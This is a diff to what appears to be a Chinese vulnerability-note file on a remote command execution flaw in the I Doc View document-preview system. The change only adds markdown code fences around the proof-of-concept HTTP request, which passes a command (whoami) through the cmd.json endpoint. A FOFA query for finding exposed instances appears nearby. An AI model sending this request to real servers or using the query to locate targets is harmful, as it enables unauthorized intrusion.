@@ -85,6 +85,7 @@ FOFA：title=="在线文档预览 - I Doc View"
 
 POC/EXP：
 
+```http
 GET //system/cmd.json?cmd=whoami HTTP/1.1
 Host: 127.0.0.1:8050
 Cache-Control: max-age=0
@@ -95,6 +96,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
+```
+
 
 ![image-20231218110211290](./.resource/iDocview系统接口存在RCE/media/image-20231218110211290.png)
 
